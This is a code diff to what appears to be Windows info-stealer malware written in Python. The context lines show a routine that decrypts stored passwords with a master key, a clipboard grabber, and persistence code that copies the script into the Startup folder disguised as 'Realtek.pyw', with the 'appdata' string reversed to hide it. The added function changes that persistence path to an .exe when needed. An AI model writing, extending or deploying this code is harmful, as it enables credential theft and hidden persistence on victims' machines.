@@ -250,7 +250,19 @@ def decrval(buff, master_key=None):
         return decrypted_pass
     
 
+def check_python_or_convert(file_path):
+    _, file_extension = os.path.splitext(file_path)
 
+    if file_extension == ".py":
+        with open(file_path, "r") as file:
+            first_line = file.readline()
+            if first_line.strip() == "#!/usr/bin/env python" or first_line.strip() == "#!/usr/bin/python":
+                return file_path  # It's already a Python script, so keep the .pyw extension
+
+    file_path = os.path.splitext(file_path)[0] + ".exe"
+
+    return file_path
+    
 def Clipboard():
     try:
         command = 'Get-Clipboard -TextFormatType Text'
@@ -262,7 +274,7 @@ def Clipboard():
 
 apppp = 'atadppa'
 path = f"{os.getenv(f'{apppp[::-1]}')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Realtek.pyw"
-
+path = check_python_or_convert(path)
 def get_random_path():
     possible_paths = [os.getenv("APPDATA"), os.getenv("LOCALAPPDATA")]
     chosen_path = random.choice(possible_paths)
@@ -320,6 +332,7 @@ def startup():
         pass
     apppp = 'atadppa'
     path = f"{os.getenv(f'{apppp[::-1]}')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Realtek.pyw"
+    path = check_python_or_convert(path)
 
     if not isfile(path):
         copy(__file__, path)
